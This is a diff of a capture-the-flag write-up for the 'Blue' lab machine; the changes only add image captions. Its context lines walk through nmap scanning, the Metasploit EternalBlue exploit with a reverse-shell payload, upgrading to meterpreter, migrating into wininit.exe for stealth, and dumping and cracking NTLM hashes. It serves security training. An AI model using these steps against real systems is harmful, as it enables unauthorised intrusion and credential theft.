@@ -28,7 +28,7 @@ I performed an **nmap** scan to find open ports and the services running on them
 nmap -sV TARGET --min-rate 10000 -oN blue.nmap -Pn
 ```
 
-![](https://cdn.ziomsec.com/blue/1.webp)
+![perfomring an nmap scan on blue machine](https://cdn.ziomsec.com/blue/1.webp)
 
 I ran a vulnerable script scan for **SMB** and found that the target was vulnerable to **MS17-010**.
 
@@ -36,7 +36,7 @@ I ran a vulnerable script scan for **SMB** and found that the target was vulnera
 nmap -p 139,445 --script=vuln TARGET -T5
 ```
 
-![](https://cdn.ziomsec.com/blue/2.webp)
+![enumerating the SMB service](https://cdn.ziomsec.com/blue/2.webp)
 
 ## Foothold
 
@@ -47,7 +47,7 @@ msfconsole
 use windows/smb/ms17_010_eternalblue
 ```
 
-![](https://cdn.ziomsec.com/blue/3.webp)
+![configuring eternal blue exploit](https://cdn.ziomsec.com/blue/3.webp)
 
 I then configured the listener IP (`LHOST`), Target IP (`RHOSTS`) and Payload (`windows/x64/shell/reverse_tcp`) and ran the exploit to get a reverse shell
 
@@ -58,7 +58,7 @@ set Payload windows/x64/shell/reverse_tcp
 run
 ```
 
-![](https://cdn.ziomsec.com/blue/4.webp)
+![running eternal blue shell](https://cdn.ziomsec.com/blue/4.webp)
 
 Now, to upgrade this shell to meterpreter, I pressed `CTRL + Z` and ran the `shell_to_meterpreter` post module
 
@@ -69,8 +69,8 @@ set session ID
 run
 ```
 
-![](https://cdn.ziomsec.com/blue/5.webp)
-![](https://cdn.ziomsec.com/blue/6.webp)
+![upgrading shell to meterpreter](https://cdn.ziomsec.com/blue/5.webp)
+![upgrading shell to meterpreter](https://cdn.ziomsec.com/blue/6.webp)
 
 Finally, I spawned a **meterpreter** session and got **NT AUTHORITY/SYSTEM** access on the target.
 
@@ -78,7 +78,7 @@ Finally, I spawned a **meterpreter** session and got **NT AUTHORITY/SYSTEM** acc
 sessions -i METERPRETER_ID
 ```
 
-![](https://cdn.ziomsec.com/blue/7.webp)
+![spawning shell as meterpreter](https://cdn.ziomsec.com/blue/7.webp)
 
 I listed the running processes. Migrating to a legitimate process would make our exploit more stealthy so I migrated to **wininit.exe**.
 
@@ -87,9 +87,9 @@ ps
 migrate WININT_PID
 ```
 
-![](https://cdn.ziomsec.com/blue/8.webp)
+![listing running processes](https://cdn.ziomsec.com/blue/8.webp)
 
-![](https://cdn.ziomsec.com/blue/9.webp)
+![migrating to a 64 bit process](https://cdn.ziomsec.com/blue/9.webp)
 
 Finally, I used **`hashdump`** to dump NTLM hashes from the target.
 
@@ -97,11 +97,11 @@ Finally, I used **`hashdump`** to dump NTLM hashes from the target.
 hashdump
 ```
 
-![](https://cdn.ziomsec.com/blue/10.webp)
+![dumping user hashes](https://cdn.ziomsec.com/blue/10.webp)
 
 I then cracked the hash of Jon using **Crackstation**.
 
-![](https://cdn.ziomsec.com/blue/11.webp)
+![cracking the hash](https://cdn.ziomsec.com/blue/11.webp)
 
 I then searched for all the flags that we had to capture and accessed them.
 
@@ -111,9 +111,9 @@ search -f "flag2.txt"
 search -f "flag3.txt"
 ```
 
-![](https://cdn.ziomsec.com/blue/12.webp)
+![capturing all 3 flags](https://cdn.ziomsec.com/blue/12.webp)
 
-![](https://cdn.ziomsec.com/blue/13.webp)
+![capturing all 3 flags](https://cdn.ziomsec.com/blue/13.webp)
 
 ## Closure
 
